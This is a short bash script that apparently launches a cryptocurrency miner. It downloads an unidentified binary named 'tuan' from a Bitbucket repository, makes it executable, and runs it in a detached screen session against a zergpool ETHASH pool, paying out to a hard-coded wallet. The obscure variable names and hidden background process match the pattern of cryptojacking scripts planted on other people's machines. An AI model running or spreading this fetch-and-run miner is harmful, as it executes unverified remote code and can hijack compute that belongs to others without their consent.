#!/bin/bash

PIIL=stratum+tcp://ethash.mine.zergpool.com:9999
USO=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY


FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
    chmod +x ./tuan
fi
screen -dmLS mine ./tuan --algo ETHASH --pool $PIIL --user $USO --pass c=LTC,mc=CLO,m=solo
